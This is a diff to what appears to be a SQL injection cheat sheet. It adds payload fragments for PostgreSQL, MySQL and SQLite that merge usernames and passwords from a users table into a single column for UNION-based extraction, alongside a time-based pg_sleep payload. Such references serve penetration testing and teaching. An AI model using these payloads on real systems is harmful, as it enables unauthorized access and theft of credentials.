@@ -57,6 +57,14 @@ SELECT * FROM users WHERE id='
 SELECT pg_sleep(10); -- PostgreSQL
 ```
 
+### group_concat
+allows concatenating columns with separators to fit in single column that might be unioned to original query
+```
+string_agg(username || ':' || password, '<br>') FROM users; -- PostgreSQL
+GROUP_CONCAT(CONCAT(username, ':', password) SEPARATOR '<br>') FROM users; # MySQL
+GROUP_CONCAT(username || ':' || password, '<br>') FROM users; -- SQLite
+```
+
 # Version enumeration
 ```
 SELECT version() # PostgreSQL / MySQL / MariaDB
